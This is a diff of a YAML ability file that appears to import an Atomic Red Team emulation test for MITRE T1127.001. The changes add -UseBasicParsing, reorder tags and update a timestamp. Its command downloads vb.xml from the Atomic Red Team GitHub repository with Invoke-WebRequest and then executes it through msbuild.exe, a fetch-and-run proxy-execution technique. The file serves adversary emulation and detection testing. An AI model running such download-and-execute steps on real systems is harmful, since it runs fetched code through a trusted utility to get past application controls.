@@ -13,8 +13,8 @@
         command: 'if (Test-Path "PathToAtomicsFolder\T1127.001\src\vb.xml") {exit
           0} else {exit 1}; then : ; else New-Item -Type Directory (split-path "PathToAtomicsFolder\T1127.001\src\vb.xml")
           -ErrorAction ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127.001/src/vb.xml"
-          -OutFile "PathToAtomicsFolder\T1127.001\src\vb.xml"; fi; C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe
-          "PathToAtomicsFolder\T1127.001\src\vb.xml"'
+          -OutFile "PathToAtomicsFolder\T1127.001\src\vb.xml" -UseBasicParsing; fi;
+          C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe "PathToAtomicsFolder\T1127.001\src\vb.xml"'
   plugin: atomic
   singleton: false
   repeatable: true
@@ -22,8 +22,8 @@
   privilege: ''
   buckets:
   - t1127.001
-  - atomic-red-team
   - execution
+  - atomic-red-team
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -50,9 +50,9 @@
         ignore | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127.001/src/vb.xml"
-        -OutFile "#{filename}"
+        -OutFile "#{filename}" -UseBasicParsing
 
         '
     technique_created: '2020-03-27T21:50:26.042Z'
     atomic_guid: ab042179-c0c5-402f-9bc8-42741f5ce359
-    import_timestamp: '2026-10-20T07:08:28.295106Z'
+    import_timestamp: '2026-10-21T07:01:50.481986Z'
